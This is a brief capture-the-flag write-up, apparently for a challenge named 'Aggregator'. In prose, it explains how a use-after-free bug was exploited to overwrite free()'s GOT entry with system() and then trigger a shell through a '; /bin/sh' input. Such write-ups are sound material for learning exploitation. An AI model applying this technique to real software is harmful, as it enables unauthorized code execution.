# Aggregator

I noticed that there was a use-after-free error, so I played around with inputs in GDB until I got a writable data pointer that also pointed to the location of an active table entry, then wrote over the pointer to the table entry's data with the pointer to the GOT of free(), found the offsets of the GOT of free() and system() in GDB in the web terminal, and used the aggregator feature to read out the value of the free() GOT entry.  Then I added in the offset and wrote system() to the GOT entry, finally writing a techinically valid line that contained "; /bin/sh" so the program would call free() on it, and gave me a shell.
